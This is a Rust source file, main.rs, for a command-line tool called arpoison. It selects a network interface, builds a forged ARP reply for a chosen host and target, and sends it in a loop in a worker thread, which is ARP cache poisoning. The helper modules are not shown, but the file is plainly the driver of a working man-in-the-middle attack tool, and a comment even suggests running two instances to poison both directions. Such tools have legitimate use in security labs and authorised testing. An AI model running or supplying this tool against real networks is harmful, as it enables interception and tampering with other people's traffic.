// File: main.rs

extern crate clap;
extern crate pnet;
extern crate colored;

use colored::*;
use pnet::datalink;
use std::process::exit;
use std::thread;

mod args;
mod link;

fn print_banner() {
    let banner = "
                                                  
                                                  
     ▄▄▄· ▄▄▄   ▄▄▄·      ▪  .▄▄ ·        ▐ ▄     
    ▐█ ▀█ ▀▄ █·▐█ ▄█▪     ██ ▐█ ▀. ▪     •█▌▐█    
    ▄█▀▀█ ▐▀▀▄  ██▀· ▄█▀▄ ▐█·▄▀▀▀█▄ ▄█▀▄ ▐█▐▐▌    
    ▐█ ▪▐▌▐█•█▌▐█▪·•▐█▌.▐▌▐█▌▐█▄▪▐█▐█▌.▐▌██▐█▌    
     ▀  ▀ .▀  ▀.▀    ▀█▄▀▪▀▀▀ ▀▀▀▀  ▀█▄▀▪▀▀ █▪    
                                                  
                                                  ";
    println!(
        "{}",
        banner
        .bright_green()
        .on_black()
    );
}

fn main() {
    print_banner();
    // Get the command line arguments
    let app_args = args::get_args();

    // Currently not supported
    // Option
    if app_args.bidirect == true {
        println!(
            "\n{}\n{}\n",
            "You have specified bidirectional operation, but this feature is not implemented.".yellow().on_black(),
            "If you want to poison in two directions, run two instances of arpoison ;P".yellow().on_black(),
        );
    }

    // Closure to be used as a filter
    let iface_match = |iface: &datalink::NetworkInterface| {
        iface.name == app_args.interface
    };
    let interfaces = datalink::interfaces();
    let iface = match interfaces.into_iter()
                                .filter(iface_match)
                                .next() {
        Some(i) => i,
        None => {
            eprintln!(
                "Could not find interface: {}, exiting.",
                app_args.interface.magenta(),
            );
            exit(1);
        },
    };

    println!(
        "\n{}{}{}\n",
        "Poisoning with interface ".bright_white().on_black(),
        iface.name.bright_blue().on_black(),
        format!(" ({})", iface.mac.unwrap()).bright_magenta().on_black().blink(),
    );

    let poison_packet = link::ArpoisonReply::new(
        app_args.host,
        iface.mac.unwrap(),
        app_args.target,
        app_args.t_mac,
    );

    let worker_one = thread::spawn(move || {
        link::send_arp_loop(&iface, &poison_packet)
    });

    match worker_one.join() {
        Ok(_) => {},
        Err(e) => {
            eprintln!(
                "{} ({:?})",
                "There was a problem joining the child thread(s)".black().on_red(),
                e,
            )
        }
    }
}
